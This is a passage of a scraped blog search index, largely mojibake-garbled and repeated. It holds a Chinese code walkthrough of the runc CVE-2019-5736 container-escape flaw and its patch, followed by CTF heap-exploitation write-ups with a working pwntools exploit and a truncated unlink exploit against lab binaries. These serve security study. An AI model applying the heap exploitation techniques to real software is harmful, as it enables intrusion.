:= notifySocket.setupSpec(context, spec); err != nil { return -1, err } } //ä¼ å…¥é…ç½®å‚æ•°ï¼Œåˆ›å»ºcontainerå¯¹è±¡ container, err := createContainer(context, id, spec) if err != nil { return -1, err } if notifySocket != nil { if err := notifySocket.setupSocketDirectory(); err != nil { return -1, err } if action == CT_ACT_RUN { if err := notifySocket.bindSocket(); err != nil { return -1, err } } } // Support on-demand socket activation by passing file descriptors into the container init process. listenFDs := []*os.File{} if os.Getenv(\"LISTEN_FDS\") != \"\" { listenFDs = activation.Files(false) } r := \u0026runner{ enableSubreaper: !context.Bool(\"no-subreaper\"), shouldDestroy: !context.Bool(\"keep\"), container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(\"console-socket\"), detach: context.Bool(\"detach\"), pidFile: context.String(\"pid-file\"), preserveFDs: context.Int(\"preserve-fds\"), action: action, criuOpts: criuOpts, init: true, } return r.run(spec.Process) } r.run()å¯¹åº”äºå®šä¹‰åœ¨utils_linux.goä¸­çš„run()ã€‚ä¹‹å‰ä¼ å…¥çš„actionå€¼ä¸ºCT_ACT_RUNï¼Œå› æ­¤è¿™é‡Œå°†ä¼šæ‰§è¡Œr.container.Run(process)ã€‚ //runc runå‘½ä»¤å¯¹åº”çš„action Action: func(context *cli.Context) error { ... //ä¼ å…¥actionå‚æ•°ä¸ºCT_ACT_RUN status, err := startContainer(context, CT_ACT_RUN, nil) ... func (r *runner) run(config *specs.Process) (int, error) { ... //æ ¹æ®configåˆ›å»ºprocess process, err := newProcess(*config) if err != nil { return -1, err } process.LogLevel = strconv.Itoa(int(logrus.GetLevel())) // Populate the fields that come from runner. process.Init = r.init //r.initä¸º true ... //r.actionæ­¤æ—¶ä¸ºCT_ACT_RUN switch r.action { case CT_ACT_CREATE: err = r.container.Start(process) case CT_ACT_RESTORE: err = r.container.Restore(process, r.criuOpts) case CT_ACT_RUN: //è°ƒç”¨è¯¥æ–¹æ³• err = r.container.Run(process) default: panic(\"Unknown action\") } ... } r.containerç”±createContainer()å‡½æ•°åˆ›å»ºï¼Œæ ¹æ®createContainer()-\u003eloadFactory()-\u003efactory.Create()çš„è°ƒç”¨é“¾å¯çŸ¥ï¼Œr.containeræœ€ç»ˆæ˜¯ç”±LinuxFactory.Create()æ‰€åˆ›å»ºã€‚æ‰€ä»¥r.container.Run()å°†ä¼šè°ƒç”¨LinuxContainer.Run()ï¼ŒRun()åŒ…å«äº†æ•´ä¸ªå®¹å™¨çš„å¯åŠ¨é€»è¾‘ã€‚ func (l *LinuxFactory) Create(id string, config *configs.Config) (Container, error) { ... c := \u0026linuxContainer{ id: id, //å®¹å™¨id root: containerRoot, config: config, initPath: l.InitPath, initArgs: l.InitArgs, criuPath: l.CriuPath, newuidmapPath: l.NewuidmapPath, newgidmapPath: l.NewgidmapPath, cgroupManager: l.NewCgroupsManager(config.Cgroups, nil), } if l.NewIntelRdtManager != nil { c.intelRdtManager = l.NewIntelRdtManager(config, id, \"\") } c.state = \u0026stoppedState{c: c} return c, nil } func (c *linuxContainer) Run(process *Process) error { if err := c.Start(process); err != nil { return err } if process.Init { return c.exec() } return nil } Run()çš„è°ƒç”¨é“¾ä¸ºlinuxContainer.Run()-\u003elinuxContainer.Start()-\u003elinuxContainer.start()ã€‚Run()/Start()éƒ½æ˜¯å°è£…çš„linuxContainerå¯¼å‡ºå‡½æ•°ï¼Œè€ŒçœŸæ­£çš„æ‰§è¡Œè¿‡ç¨‹åœ¨start()ä¸­ã€‚ start()å‡½æ•°è°ƒç”¨newParentProcess()åˆ›å»ºçˆ¶è¿›ç¨‹å¯¹è±¡parentï¼Œå¹¶è°ƒç”¨parent.start()å¯åŠ¨å­è¿›ç¨‹ã€‚ func (c *linuxContainer) start(process ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:2:1","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬ä¸‰ç‰ˆ","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#å…·ä½“ä»£ç åˆ†æ"},{"categories":["æºç é˜…è¯»"],"content":"å…·ä½“ä»£ç åˆ†æ runcå¯åŠ¨å®¹å™¨çš„è¿‡ç¨‹ runc runå¯¹åº”çš„commandåœ¨run.goä¸­è¢«å®šä¹‰ // default action is to start a container var runCommand = cli.Command{ Name: \"run\", Usage: \"create and run a container\", ... Action: func(context *cli.Context) error { if err := checkArgs(context, 1, exactArgs); err != nil { return err } status, err := startContainer(context, CT_ACT_RUN, nil) if err == nil { // exit with the container's exit status so any external supervisor is // notified of the exit with the correct exit status. os.Exit(status) } return fmt.Errorf(\"runc run failed: %w\", err) }, } å¯¹åº”çš„Actionä¼šæ‰§è¡ŒstartContainer()å‡½æ•°ã€‚è¯¥å‡½æ•°ä¼šè¯»å–å®¹å™¨é…ç½®æ–‡ä»¶config.jsonçš„ä¿¡æ¯ï¼Œç”Ÿæˆspecå¯¹è±¡ï¼Œå†å°†å…¶ä½œä¸ºå‚æ•°é€šè¿‡createContainer()ç”Ÿæˆcontainerå¯¹è±¡ã€‚é€šè¿‡åŒ…å«containerå¯¹è±¡çš„runnerå¯¹è±¡è°ƒç”¨r.run()å¯åŠ¨å®¹å™¨ã€‚ func startContainer(context *cli.Context, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) { if err := revisePidFile(context); err != nil { return -1, err } //è¯»å–é…ç½®æ–‡ä»¶ï¼Œè·å–é…ç½®ä¿¡æ¯ spec, err := setupSpec(context) if err != nil { return -1, err } id := context.Args().First() if id == \"\" { return -1, errEmptyID } notifySocket := newNotifySocket(context, os.Getenv(\"NOTIFY_SOCKET\"), id) if notifySocket != nil { if err := notifySocket.setupSpec(context, spec); err != nil { return -1, err } } //ä¼ å…¥é…ç½®å‚æ•°ï¼Œåˆ›å»ºcontainerå¯¹è±¡ container, err := createContainer(context, id, spec) if err != nil { return -1, err } if notifySocket != nil { if err := notifySocket.setupSocketDirectory(); err != nil { return -1, err } if action == CT_ACT_RUN { if err := notifySocket.bindSocket(); err != nil { return -1, err } } } // Support on-demand socket activation by passing file descriptors into the container init process. listenFDs := []*os.File{} if os.Getenv(\"LISTEN_FDS\") != \"\" { listenFDs = activation.Files(false) } r := \u0026runner{ enableSubreaper: !context.Bool(\"no-subreaper\"), shouldDestroy: !context.Bool(\"keep\"), container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(\"console-socket\"), detach: context.Bool(\"detach\"), pidFile: context.String(\"pid-file\"), preserveFDs: context.Int(\"preserve-fds\"), action: action, criuOpts: criuOpts, init: true, } return r.run(spec.Process) } r.run()å¯¹åº”äºå®šä¹‰åœ¨utils_linux.goä¸­çš„run()ã€‚ä¹‹å‰ä¼ å…¥çš„actionå€¼ä¸ºCT_ACT_RUNï¼Œå› æ­¤è¿™é‡Œå°†ä¼šæ‰§è¡Œr.container.Run(process)ã€‚ //runc runå‘½ä»¤å¯¹åº”çš„action Action: func(context *cli.Context) error { ... //ä¼ å…¥actionå‚æ•°ä¸ºCT_ACT_RUN status, err := startContainer(context, CT_ACT_RUN, nil) ... func (r *runner) run(config *specs.Process) (int, error) { ... //æ ¹æ®configåˆ›å»ºprocess process, err := newProcess(*config) if err != nil { return -1, err } process.LogLevel = strconv.Itoa(int(logrus.GetLevel())) // Populate the fields that come from runner. process.Init = r.init //r.initä¸º true ... //r.actionæ­¤æ—¶ä¸ºCT_ACT_RUN switch r.action { case CT_ACT_CREATE: err = r.container.Start(process) case CT_ACT_RESTORE: err = r.container.Restore(process, r.criuOpts) case CT_ACT_RUN: //è°ƒç”¨è¯¥æ–¹æ³• err = r.container.Run(process) default: panic(\"Unknown action\") } ... } r.containerç”±createContainer()å‡½æ•°åˆ›å»ºï¼Œæ ¹æ®createContainer()-loadFactory()-factory.Create()çš„è°ƒç”¨é“¾å¯çŸ¥ï¼Œr.containeræœ€ç»ˆæ˜¯ç”±LinuxFactory.Create()æ‰€åˆ›å»ºã€‚æ‰€ä»¥r.container.Run()å°†ä¼šè°ƒç”¨LinuxContainer.Run()ï¼ŒRun()åŒ…å«äº†æ•´ä¸ªå®¹å™¨çš„å¯åŠ¨é€»è¾‘ã€‚ func (l *LinuxFactory) Create(id string, config *configs.Config) (Container, error) { ... c := \u0026linuxContainer{ id: id, //å®¹å™¨id root: containerRoot, config: config, initPath: l.InitPath, initArgs: l.InitArgs, criuPath: l.CriuPath, newuidmapPath: l.NewuidmapPath, newgidmapPath: l.NewgidmapPath, cgroupManager: l.NewCgroupsManager(config.Cgroups, nil), } if l.NewIntelRdtManager != nil { c.intelRdtManager = l.NewIntelRdtManager(config, id, \"\") } c.state = \u0026stoppedState{c: c} return c, nil } func (c *linuxContainer) Run(process *Process) error { if err := c.Start(process); err != nil { return err } if process.Init { return c.exec() } return nil } Run()çš„è°ƒç”¨é“¾ä¸ºlinuxContainer.Run()-linuxContainer.Start()-linuxContainer.start()ã€‚Run()/Start()éƒ½æ˜¯å°è£…çš„linuxContainerå¯¼å‡ºå‡½æ•°ï¼Œè€ŒçœŸæ­£çš„æ‰§è¡Œè¿‡ç¨‹åœ¨start()ä¸­ã€‚ start()å‡½æ•°è°ƒç”¨newParentProcess()åˆ›å»ºçˆ¶è¿›ç¨‹å¯¹è±¡parentï¼Œå¹¶è°ƒç”¨parent.start()å¯åŠ¨å­è¿›ç¨‹ã€‚ func (c *linuxContainer) start(process ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:2:1","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬ä¸‰ç‰ˆ","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#runcå¯åŠ¨å®¹å™¨çš„è¿‡ç¨‹"},{"categories":["æºç é˜…è¯»"],"content":"å…·ä½“ä»£ç åˆ†æ runcå¯åŠ¨å®¹å™¨çš„è¿‡ç¨‹ runc runå¯¹åº”çš„commandåœ¨run.goä¸­è¢«å®šä¹‰ // default action is to start a container var runCommand = cli.Command{ Name: \"run\", Usage: \"create and run a container\", ... Action: func(context *cli.Context) error { if err := checkArgs(context, 1, exactArgs); err != nil { return err } status, err := startContainer(context, CT_ACT_RUN, nil) if err == nil { // exit with the container's exit status so any external supervisor is // notified of the exit with the correct exit status. os.Exit(status) } return fmt.Errorf(\"runc run failed: %w\", err) }, } å¯¹åº”çš„Actionä¼šæ‰§è¡ŒstartContainer()å‡½æ•°ã€‚è¯¥å‡½æ•°ä¼šè¯»å–å®¹å™¨é…ç½®æ–‡ä»¶config.jsonçš„ä¿¡æ¯ï¼Œç”Ÿæˆspecå¯¹è±¡ï¼Œå†å°†å…¶ä½œä¸ºå‚æ•°é€šè¿‡createContainer()ç”Ÿæˆcontainerå¯¹è±¡ã€‚é€šè¿‡åŒ…å«containerå¯¹è±¡çš„runnerå¯¹è±¡è°ƒç”¨r.run()å¯åŠ¨å®¹å™¨ã€‚ func startContainer(context *cli.Context, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) { if err := revisePidFile(context); err != nil { return -1, err } //è¯»å–é…ç½®æ–‡ä»¶ï¼Œè·å–é…ç½®ä¿¡æ¯ spec, err := setupSpec(context) if err != nil { return -1, err } id := context.Args().First() if id == \"\" { return -1, errEmptyID } notifySocket := newNotifySocket(context, os.Getenv(\"NOTIFY_SOCKET\"), id) if notifySocket != nil { if err := notifySocket.setupSpec(context, spec); err != nil { return -1, err } } //ä¼ å…¥é…ç½®å‚æ•°ï¼Œåˆ›å»ºcontainerå¯¹è±¡ container, err := createContainer(context, id, spec) if err != nil { return -1, err } if notifySocket != nil { if err := notifySocket.setupSocketDirectory(); err != nil { return -1, err } if action == CT_ACT_RUN { if err := notifySocket.bindSocket(); err != nil { return -1, err } } } // Support on-demand socket activation by passing file descriptors into the container init process. listenFDs := []*os.File{} if os.Getenv(\"LISTEN_FDS\") != \"\" { listenFDs = activation.Files(false) } r := \u0026runner{ enableSubreaper: !context.Bool(\"no-subreaper\"), shouldDestroy: !context.Bool(\"keep\"), container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(\"console-socket\"), detach: context.Bool(\"detach\"), pidFile: context.String(\"pid-file\"), preserveFDs: context.Int(\"preserve-fds\"), action: action, criuOpts: criuOpts, init: true, } return r.run(spec.Process) } r.run()å¯¹åº”äºå®šä¹‰åœ¨utils_linux.goä¸­çš„run()ã€‚ä¹‹å‰ä¼ å…¥çš„actionå€¼ä¸ºCT_ACT_RUNï¼Œå› æ­¤è¿™é‡Œå°†ä¼šæ‰§è¡Œr.container.Run(process)ã€‚ //runc runå‘½ä»¤å¯¹åº”çš„action Action: func(context *cli.Context) error { ... //ä¼ å…¥actionå‚æ•°ä¸ºCT_ACT_RUN status, err := startContainer(context, CT_ACT_RUN, nil) ... func (r *runner) run(config *specs.Process) (int, error) { ... //æ ¹æ®configåˆ›å»ºprocess process, err := newProcess(*config) if err != nil { return -1, err } process.LogLevel = strconv.Itoa(int(logrus.GetLevel())) // Populate the fields that come from runner. process.Init = r.init //r.initä¸º true ... //r.actionæ­¤æ—¶ä¸ºCT_ACT_RUN switch r.action { case CT_ACT_CREATE: err = r.container.Start(process) case CT_ACT_RESTORE: err = r.container.Restore(process, r.criuOpts) case CT_ACT_RUN: //è°ƒç”¨è¯¥æ–¹æ³• err = r.container.Run(process) default: panic(\"Unknown action\") } ... } r.containerç”±createContainer()å‡½æ•°åˆ›å»ºï¼Œæ ¹æ®createContainer()-loadFactory()-factory.Create()çš„è°ƒç”¨é“¾å¯çŸ¥ï¼Œr.containeræœ€ç»ˆæ˜¯ç”±LinuxFactory.Create()æ‰€åˆ›å»ºã€‚æ‰€ä»¥r.container.Run()å°†ä¼šè°ƒç”¨LinuxContainer.Run()ï¼ŒRun()åŒ…å«äº†æ•´ä¸ªå®¹å™¨çš„å¯åŠ¨é€»è¾‘ã€‚ func (l *LinuxFactory) Create(id string, config *configs.Config) (Container, error) { ... c := \u0026linuxContainer{ id: id, //å®¹å™¨id root: containerRoot, config: config, initPath: l.InitPath, initArgs: l.InitArgs, criuPath: l.CriuPath, newuidmapPath: l.NewuidmapPath, newgidmapPath: l.NewgidmapPath, cgroupManager: l.NewCgroupsManager(config.Cgroups, nil), } if l.NewIntelRdtManager != nil { c.intelRdtManager = l.NewIntelRdtManager(config, id, \"\") } c.state = \u0026stoppedState{c: c} return c, nil } func (c *linuxContainer) Run(process *Process) error { if err := c.Start(process); err != nil { return err } if process.Init { return c.exec() } return nil } Run()çš„è°ƒç”¨é“¾ä¸ºlinuxContainer.Run()-linuxContainer.Start()-linuxContainer.start()ã€‚Run()/Start()éƒ½æ˜¯å°è£…çš„linuxContainerå¯¼å‡ºå‡½æ•°ï¼Œè€ŒçœŸæ­£çš„æ‰§è¡Œè¿‡ç¨‹åœ¨start()ä¸­ã€‚ start()å‡½æ•°è°ƒç”¨newParentProcess()åˆ›å»ºçˆ¶è¿›ç¨‹å¯¹è±¡parentï¼Œå¹¶è°ƒç”¨parent.start()å¯åŠ¨å­è¿›ç¨‹ã€‚ func (c *linuxContainer) start(process ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:2:1","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬ä¸‰ç‰ˆ","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#pocä»£ç "},{"categories":["æºç é˜…è¯»"],"content":"æ¼æ´ä¿®å¤ runcå›¢é˜Ÿåœ¨1.0.0-rc7çš„ç‰ˆæœ¬ä¸­å¢åŠ äº†è¯¥æ¼æ´çš„è¡¥ä¸ï¼Œä¿®å¤æ¼æ´çš„æ–¹å¼æ˜¯åœ¨runc initè¿›ç¨‹è¿›å…¥åˆ°å®¹å™¨å‘½åç©ºé—´ä¹‹å‰ï¼Œå…ˆå°†/proc/self/exeï¼ˆå³å®¿ä¸»æœºä¸Šçš„runcï¼‰å¤åˆ¶åˆ°å†…å­˜ä¸­ï¼Œç„¶åç”¨å¤åˆ¶äº§ç”Ÿçš„åŒ¿åæ–‡ä»¶æ›¿æ¢å½“å‰è¢«æ‰§è¡Œæ–‡ä»¶çš„å¥æŸ„ï¼Œè¿™æ ·å°±èƒ½å¤Ÿé˜²æ­¢å°†å®¿ä¸»æœºçš„runcæ–‡ä»¶æš´éœ²ç»™å®¹å™¨å†…éƒ¨çš„è¿›ç¨‹ã€‚ void nsexec(void) { ... /* * We need to re-exec if we are not in a cloned binary. This is necessary * to ensure that containers won't be able to access the host binary * through /proc/self/exe. See CVE-2019-5736. */ if (ensure_cloned_binary() \u003c 0) bail(\"could not ensure we are a cloned binary\"); ... } int ensure_cloned_binary(void) { int execfd; char **argv = NULL; /* Check that we're not self-cloned, and if we are then bail. */ int cloned = is_self_cloned(); if (cloned \u003e 0 || cloned == -ENOTRECOVERABLE) return cloned; if (fetchve(\u0026argv) \u003c 0) return -EINVAL; //å¤åˆ¶åŒ¿åæ–‡ä»¶ execfd = clone_binary(); if (execfd \u003c 0) return -EIO; if (putenv(CLONED_BINARY_ENV \"=1\")) goto error; //æ‰§è¡Œè¯¥å¤åˆ¶çš„åŒ¿åæ–‡ä»¶ fexecve(execfd, argv, environ); error: close(execfd); return -ENOEXEC; } ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:3:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬ä¸‰ç‰ˆ","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#æ¼æ´ä¿®å¤"},{"categories":["æºç é˜…è¯»"],"content":"ä¿®è¡¥å»ºè®® æ›´æ–°dockerï¼Œä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„runc æ‰§è¡Œdocker execå‘½ä»¤å¯åŠ¨å®¹å™¨æ—¶ï¼Œå¼€å¯SELinuxé€‰é¡¹ï¼Œé™åˆ¶å®¹å™¨å†…éƒ¨è¿›ç¨‹å¯è®¿é—®çš„èµ„æº è®¾ç½®å®¿ä¸»æœºä¸Šçš„runcäºŒè¿›åˆ¶æ–‡ä»¶ä¸ºåªè¯» å°½é‡é¿å…ç»™äºˆå®¹å™¨ç”¨æˆ·å®¹å™¨å†…éƒ¨çš„rootæƒé™ ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:4:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬ä¸‰ç‰ˆ","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#ä¿®è¡¥å»ºè®®"},{"categories":["æºç é˜…è¯»"],"content":"PS è¿™é‡Œè¿˜æœ‰å¦ä¸€ä¸ªç‚¹æƒ³è®°ä¸€ä¸‹ã€‚æˆ‘ä¸€å¼€å§‹æ€»æƒ³ï¼Œæ—¢ç„¶è¿›å…¥pidå‘½åç©ºé—´ä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡/proc/çœ‹åˆ°ï¼Œé‚£ä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨runc initè¿›ç¨‹çš„esexec()å‡½æ•°æ‰§è¡Œå®Œä¹‹åå°±å¼€å§‹è¿›è¡Œpocé‡Œé¢çš„æ”»å‡»æ“ä½œå‘¢ã€‚åæ¥æˆ‘ç»è¿‡æŸ¥æ‰¾èµ„æ–™å‘ç°ï¼Œç¡®å®æœ‰åˆ«çš„åšå®¢è¯´è¿‡è¿™ä¸ªé—®é¢˜ï¼Œå¹¶ä¸”è¯´æ˜å…¶å®åœ¨æ›´æ—©æœŸçš„runcç‰ˆæœ¬ä¸­ï¼Œå°±æ˜¯å­˜åœ¨è¿™ä¸€æ¼æ´çš„ã€‚æ”»å‡»è€…ç¡®å®å¯ä»¥åœ¨runc initè¿›å…¥å‘½åç©ºé—´ä¹‹åå°è¯•ä¿®æ”¹å®¿ä¸»æœºä¸Šçš„runcæ–‡ä»¶ï¼Œè¿™ä¸€é—®é¢˜ä¹Ÿè¢«åˆ†å‘äº†ä¸€ä¸ªcveï¼Œç¼–å·ä¸ºCVE-2016-9962ã€‚ä½†æ˜¯ç”±äºnsexec()ä¸æœ€åçš„system.Exec()è¿›ç¨‹æ›¿æ¢ä¹‹é—´çš„æ—¶é—´çª—æ ¼è¾ƒå°ï¼Œæ‰€ä»¥æ”»å‡»éš¾åº¦è¾ƒå¤§ï¼Œè¯¥æ¼æ´çš„ä¸¥é‡ç¨‹åº¦ä¹Ÿå¹¶æ²¡æœ‰é‚£ä¹ˆçš„é«˜ã€‚ From: Aleksa Sarai runC passes a file descriptor from the hostâ€™s filesystem to the â€œrunc initâ€ bootstrap process when joining a container. This allows a malicious process inside a container to gain access to the host filesystem with its current privilege set. Due to the race window between join-and-execve being quite small, this bug is quite hard to exploit. A similar, though mostly unrelated, exploit was discovered in LXC[1]. ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:5:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬ä¸‰ç‰ˆ","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#ps"},{"categories":["æºç é˜…è¯»"],"content":"å¾€æœŸå›é¡¾ docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬äºŒç‰ˆ ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:6:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬ä¸‰ç‰ˆ","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#å¾€æœŸå›é¡¾"},{"categories":["CTF"],"content":"0x00 å‰è¨€ é›¶é›¶æ•£æ•£åœ°çœ‹äº†ä¸¤ä¸‰å¤©æ—¶é—´æ‰æŠŠå †çš„ä¸€äº›åŸºç¡€å†…å®¹ä¸ä¸€é“é¢˜çœ‹æ‡‚ğŸ˜‘ ","date":"2021-09-06","objectID":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/:1:0","series":null,"tags":["CTF","pwn","å †"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆä¸‰ï¼‰ï¼šå †å­¦ä¹ ","uri":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/#0x00-å‰è¨€"},{"categories":["CTF"],"content":"0x01 picoctf_2018_are you root é¢˜ç›®é“¾æ¥ æ„Ÿå¤©åŠ¨åœ°ï¼Œæˆ‘å±…ç„¶è‡ªå·±åšå‡ºäº†ä¸€é“å †é¢˜ï¼Œè™½ç„¶è¿™é¢˜éå¸¸ç®€å•ã€‚ è¿™é¢˜å¥½åƒè·Ÿå †çš„æœºåˆ¶ä¹Ÿæ²¡å•¥å¤§å…³ç³»â€¦ æ¯æ¬¡loginçš„æ—¶å€™ï¼Œchunkå¸ƒå±€å¦‚ä¸‹æ‰€ç¤ºï¼ˆå‡è®¾è¾“å…¥ç”¨æˆ·åé•¿åº¦\u003c=0x18ï¼‰ï¼š ------------------ | | 0x21 | allocated ----------------- |str_ptr| level | ------------------ | | 0x21 | allocated ----------------- | str content.. | ------------------ top chunk è¿™é¢˜çš„æ¼æ´ç‚¹åœ¨äºï¼Œmallocä¸freeçš„æ¬¡æ•°ä¸åŒ¹é…ã€‚ç¨‹åºä¸­å†™å…¥ç”¨æˆ·åæ—¶ä½¿ç”¨äº†strdupï¼Œ**è¿™ä¸ªå‡½æ•°æ˜¯éšå«ç€mallocçš„è°ƒç”¨çš„ï¼Œè€Œresetæ—¶åˆåªè¿›è¡Œäº†ä¸€æ¬¡freeè°ƒç”¨ã€‚æ‰€ä»¥ï¼Œæ­£å¸¸çš„ä¸€æ¬¡loginä¸resetæ“ä½œä¹‹åï¼Œchunkä¸fastbinçš„æƒ…å†µä¸ºï¼š ------------------ | | 0x21 | allocated ----------------- |str_ptr| level | ------------------ | | 0x21 | free ----------------- | str content.. | ------------------ top chunk =================== fastbin: -\u003e ----------------- | | 0x21 | ----------------- | str content.. | ------------------ æ‰€ä»¥è¿™æ—¶å†è¿›è¡Œloginï¼Œå¾—åˆ°çš„å°±æ˜¯å†™å…¥äº†ç”¨æˆ·åå†…å®¹çš„chunkï¼Œè¿™æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚è€Œä»£è¡¨auth-levelçš„å€¼å°±ä½äºptr+0x8ï¼Œæˆ‘ä»¬åªè¦åœ¨ç¬¬ä¸€æ¬¡loginçš„æ—¶å€™ï¼ŒæŠŠè¯¥å¤„å†…å®¹å†™ä¸º\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00ï¼Œç„¶åresetï¼Œå†loginå³å¯ã€‚ exp from pwn import * context(os = 'linux', arch = 'amd64') # context.log_level = 'debug' p = remote('node4.buuoj.cn', 29378) def get_flag(): p.recvuntil(b'Enter your command:\\n\u003e ') p.sendline(b'get-flag') def login(content: bytes): p.recvuntil(b'Enter your command:\\n\u003e ') p.sendline(b'login ' + content) def reset(): p.recvuntil(b'Enter your command:\\n\u003e ') p.sendline(b'reset') payload = b'a'*0x8 + b'\\x05'.ljust(8, b'\\x00') login(payload) reset() login(b'test') get_flag() p.interactive() flagæˆªå›¾image-20210906144421764 \" flagæˆªå›¾ ps: #define DWORD __uint32_tï¼Œæ‰€ä»¥DWORDåœ¨x86/x64éƒ½æ˜¯4å­—èŠ‚å¤§å°ï¼Œè€Œä¸æ˜¯å­—é¢æ„æ€çš„2å€å­—é•¿ã€‚ ","date":"2021-09-06","objectID":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/:2:0","series":null,"tags":["CTF","pwn","å †"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆä¸‰ï¼‰ï¼šå †å­¦ä¹ ","uri":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/#0x01-picoctf_2018_are-you-root"},{"categories":["CTF"],"content":"0x02 hitcon2014_stkof é¢˜ç›®é“¾æ¥ libc version: Ubuntu GLIBC 2.23-0ubuntu10 å †æº¢å‡ºï¼Œunlinkåˆ©ç”¨ã€‚èƒ½å¤Ÿå®ç°ä¿®æ”¹æŸä¸ªåœ°å€addrå¤„çš„å€¼ä¸ºaddr-0x18ï¼Œåœ¨æœ¬é¢˜ä¸­åˆ™æ˜¯ä¿®æ”¹è®°å½•chunkä¿¡æ¯çš„heapArrayæ•°ç»„ä¸­çš„å€¼ï¼Œå®ç°heapArray[2] = \u0026heapArray[2]-0x8ã€‚ å¦‚æœå¯¹äº2.23ç‰ˆæœ¬ä¸­unlinkçš„å†…å®¹ä¸å¤ªè®°å¾—äº†ï¼Œå¯ä»¥å»ç¿»ä¸€ä¸‹ctf-wikiã€‚ from pwn import * context.os = 'linux' context.arch = 'amd64' context.log_level = 'debug' context.terminal = [\"tmux\",\"splitw\",\"-h\"] # p = remote('') if args.LOCAL: # æœ¬åœ°ç”¨2.23libcè°ƒè¯• ld_path = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so' libc_path = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so' # libc_path = './libc.so.6' p = process([ld_path, './stkof'], env = {'LD_PRELOAD': libc_path}) gdb.attach(p) else: libc_path = './libc.so.6' p = remote('node4.buuoj.cn', 26958) def add(size: int): p.sendline(b'1') p.sendline(str(size).encode()) p.recvuntil(b'OK\\n') def edit(index: int, size: int, content: bytes): p.sendline(b'2') p.sendline(str(index).encode()) p.sendline(str(size).encode()) assert len(content) == size, \"make sure you entered the correct input\" p.send(content) def delete(index: int): p.sendline(b'3') p.sendline(str(index).encode()) def show(index: int): p.sendline(b'4') p.sendline(str(index).encode()) s_addr = 